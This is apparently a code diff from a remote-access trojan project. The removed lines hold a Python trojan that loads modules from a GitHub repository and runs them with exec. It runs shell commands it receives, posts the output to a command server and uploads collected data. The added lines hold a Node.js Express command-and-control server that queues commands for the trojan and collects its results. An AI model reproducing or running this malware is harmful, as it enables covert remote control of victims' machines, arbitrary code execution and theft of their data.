@@ -1,133 +1,62 @@
-import base64
-import github3
-import importlib
-import json
-import random
-import sys
-import threading
-import time
-import subprocess
-import requests
-from datetime import datetime
+const express = require('express');
+const bodyParser = require('body-parser');
 
-def github_connect():
-    with open('secret.txt') as f:
-        token = f.read().strip()
-    user = 'hacksparkdev'
-    sess = github3.login(token=token)
-    return sess.repository(user, 'Trojan')
+const app = express();
+const port = 3000;
 
-def get_file_contents(dirname, module_name, repo):
-    return repo.file_contents(f'{dirname}/{module_name}').content
+let commands = [];
+let status = "";
+let trojanRunning = true;
 
-class Trojan:
-    def __init__(self, id, node_server_url):
-        self.id = id
-        self.config_file = f'{id}.json'
-        self.data_path = f'data/{self.id}/'
-        self.repo = github_connect()
-        self.node_server_url = node_server_url
-        self.running = True
+app.use(bodyParser.json());
 
-    def get_github_config(self):
-        config_json = get_file_contents('config', self.config_file, self.repo)
-        return json.loads(base64.b64decode(config_json))
+// Endpoint to get current configuration (commands)
+app.get('/config', (req, res) => {
+    res.json({
+        stop: !trojanRunning,
+        commands: commands
+    });
+    // Clear the commands after sending them to the trojan
+    commands = [];
+});
 
-    def get_nodejs_config(self):
-        try:
-            response = requests.get(f"{self.node_server_url}/config")
-            return response.json()
-        except requests.exceptions.RequestException as e:
-            print(f"[*] Failed to get config from Node.js server: {e}")
-            return None
+// Endpoint to receive command results
+app.post('/command', (req, res) => {
+    const { command, result } = req.body;
+    console.log(`Received result for command '${command}': ${result}`);
+    res.sendStatus(200);
+});
 
-    def send_command_result(self, command, result):
-        try:
-            payload = {
-                "command": command,
-                "result": result
-            }
-            requests.post(f"{self.node_server_url}/command", json=payload)
-        except requests.exceptions.RequestException as e:
-            print(f"[*] Failed to send command result to Node.js server: {e}")
+// Endpoint to update trojan status
+app.post('/status', (req, res) => {
+    const { id, status: newStatus } = req.body;
+    status = newStatus;
+    console.log(`Trojan ID: ${id} Status: ${status}`);
+    res.sendStatus(200);
+});
 
-    def update_status(self, status):
-        try:
-            payload = {
-                "id": self.id,
-                "status": status
-            }
-            requests.post(f"{self.node_server_url}/status", json=payload)
-        except requests.exceptions.RequestException as e:
-            print(f"[*] Failed to update status on Node.js server: {e}")
+// Endpoint to send new commands to the trojan
+app.post('/send-command', (req, res) => {
+    const { command } = req.body;
+    if (command) {
+        commands.push(command);
+        console.log(`Command '${JSON.stringify(command)}' added to queue.`);
+        res.sendStatus(200);
+    } else {
+        console.log("Invalid command format.");
+        res.sendStatus(400);
+    }
+});
 
-    def execute_command(self, command):
-        try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            result = result.decode('utf-8')
-        except subprocess.CalledProcessError as e:
-            result = e.output.decode('utf-8')
-        self.send_command_result(command, result)
+// Endpoint to stop the trojan
+app.post('/stop-trojan', (req, res) => {
+    trojanRunning = false;
+    console.log("Trojan stop signal sent.");
+    res.sendStatus(200);
+});
 
-    def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
-
-    def store_module_result(self, data):
-        message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
-        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
-        self.repo.create_file(remote_path, message, bindata)
-
-    def run(self):
-        while self.running:
-            # Fetch configuration from GitHub
-            github_config = self.get_github_config()
-
-            # Fetch real-time commands from Node.js server
-            nodejs_config = self.get_nodejs_config()
-
-            if nodejs_config:
-                if nodejs_config.get('stop'):
-                    self.running = False
-                    self.update_status("Trojan stopped.")
-                    break
-
-                # Execute commands from Node.js server
-                for command in nodejs_config.get('commands', []):
-                    self.execute_command(command)
-                    for module in github_config.get('modules', []):
-                        if module['enabled'] and module['module'] == command:
-                            thread = threading.Thread(target=self.module_runner, args=(module['module'],))
-                            thread.start()
-
-            time.sleep(random.randint(30*60, 3*60*60))
-
-class GitImporter:
-    def __init__(self):
-        self.current_module_code = ""
-
-    def find_spec(self, fullname, path, target=None):
-        print(f"[*] Attempting to retrieve {fullname}")
-        self.repo = github_connect()
-        try:
-            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
-            if new_library is not None:
-                self.current_module_code = base64.b64decode(new_library)
-                return importlib.util.spec_from_loader(fullname, loader=self)
-        except github3.exceptions.NotFoundError:
-            print(f"[*] Module {fullname} not found in repository.")
-            return None
-
-    def create_module(self, spec):
-        return None
-
-    def exec_module(self, module):
-        exec(self.current_module_code, module.__dict__)
-
-if __name__ == '__main__':
-    sys.meta_path.append(GitImporter())
-    NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
-    trojan = Trojan('abc', NODE_SERVER_URL)
-    trojan.run()
+// Start server
+app.listen(port, () => {
+    console.log(`Node.js server running at http://localhost:${port}`);
+});
 
